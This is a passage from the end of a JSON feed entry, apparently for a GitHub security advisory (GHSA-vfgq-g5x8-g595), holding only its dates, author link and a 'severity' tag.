            "date_modified": "2023-03-23T22:09:22.000Z",
            "date_published": "2023-03-23T19:58:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfgq-g5x8-g595"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}